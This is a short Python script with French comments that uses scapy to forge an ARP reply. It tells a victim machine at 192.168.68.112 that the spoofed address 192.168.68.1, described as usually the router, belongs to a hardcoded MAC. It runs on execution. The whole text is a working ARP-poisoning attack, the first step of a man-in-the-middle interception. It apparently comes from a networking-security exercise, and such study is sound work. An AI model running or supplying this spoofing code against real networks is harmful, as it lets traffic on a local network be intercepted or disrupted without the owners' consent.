#!/usr/bin/python3

import scapy.all as scapy

# FUNC1 main
def spoof(victim_ip, spoof_ip):
    # victime ip est l'ip de la victime et spoof_ip est celle de l'usurpé.
    target_mac = "08-00-27-0F-AE-66"
    packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = target_mac, psrc = spoof_ip)
    # on crée un paquet ARP qui part de l'ip de l'usurpé vers la victime.
    scapy.send(packet, verbose = False) 

# cette fonction envoie un paquet ARP à la victime et donc se fait passer pour l'usurpé(souvent un routeur).

spoof("192.168.68.112", "192.168.68.1")
